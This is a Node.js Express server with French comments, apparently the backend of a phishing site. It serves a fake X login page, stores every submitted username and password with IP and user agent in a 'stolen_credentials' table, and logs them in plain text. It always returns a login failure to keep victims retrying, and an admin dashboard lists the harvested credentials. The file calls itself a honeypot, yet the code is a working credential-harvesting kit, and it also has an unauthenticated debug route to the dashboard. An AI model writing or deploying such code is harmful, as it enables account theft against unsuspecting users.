const express = require('express');
const session = require('express-session');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const PORT = process.env.PORT || 3000;

// --- BASE DE DONNÉES ---
const db = new sqlite3.Database('local.db');

// Créer la table
db.run(`
    CREATE TABLE IF NOT EXISTS stolen_credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        ip TEXT,
        user_agent TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
`);

// --- MIDDLEWARE ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// --- SESSIONS ---
app.use(session({
    secret: process.env.SESSION_SECRET || 'honeypot-secret-123',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000
    }
}));

// --- ROUTES ---

// Page d'accueil (fausse page X)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Page de connexion admin
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'private', 'admin.html'));
});

// Dashboard admin (protégé)
app.get('/admin/dashboard', (req, res) => {
    if (!req.session.user) {
        return res.redirect('/admin');
    }
    res.sendFile(path.join(__dirname, 'private', 'dashboard.html'));
});

// Dashboard direct (sans auth - pour debug)
app.get('/admin/dashboard-direct', (req, res) => {
    res.sendFile(path.join(__dirname, 'private', 'dashboard.html'));
});

// --- API ROUTES ---

// Enregistrer les identifiants volés
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: 'Champs requis' });
    }

    const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';

    db.run(
        'INSERT INTO stolen_credentials (username, password, ip, user_agent) VALUES (?, ?, ?, ?)',
        [username, password, ip, userAgent],
        function(err) {
            if (err) {
                console.error('❌ Erreur insertion:', err.message);
                return res.status(500).json({ error: 'Erreur serveur' });
            }

            console.log(`🔴 IDENTIFIANTS VOLÉS : ${username} / ${password}`);

            // Toujours répondre "échec" (c'est le piège)
            res.status(401).json({
                error: 'Identifiants incorrects. Veuillez réessayer.'
            });
        }
    );
});

// Récupérer les identifiants volés (protégé)
app.get('/api/credentials', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Non autorisé' });
    }

    db.all('SELECT * FROM stolen_credentials ORDER BY created_at DESC', (err, rows) => {
        if (err) {
            console.error('❌ Erreur récupération:', err.message);
            return res.status(500).json({ error: 'Erreur serveur' });
        }
        res.json(rows);
    });
});

// Supprimer un identifiant (protégé)
app.delete('/api/credentials/:id', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Non autorisé' });
    }

    const id = req.params.id;
    db.run('DELETE FROM stolen_credentials WHERE id = ?', [id], function(err) {
        if (err) {
            console.error('❌ Erreur suppression:', err.message);
            return res.status(500).json({ error: 'Erreur serveur' });
        }
        res.json({ success: true });
    });
});

// Connexion admin
app.post('/api/admin-login', (req, res) => {
    const { username, password } = req.body;
    const adminUser = process.env.ADMIN_USER || 'admin';
    const adminPass = process.env.ADMIN_PASSWORD || 'changeme';

    if (username === adminUser && password === adminPass) {
        req.session.user = { username };
        console.log(`✅ Admin connecté : ${username}`);
        res.json({ success: true });
    } else {
        console.log(`❌ Tentative échouée : ${username}`);
        res.status(401).json({ error: 'Identifiants incorrects' });
    }
});

// Déconnexion
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// --- DÉMARRAGE ---
app.listen(PORT, () => {
    console.log(`🚀 Serveur lancé sur http://localhost:${PORT}`);
    console.log(`📡 Fausse page X : http://localhost:${PORT}/`);
    console.log(`🔐 Admin : http://localhost:${PORT}/admin`);
    console.log(`🛠️  Debug : http://localhost:${PORT}/admin/dashboard-direct`);
});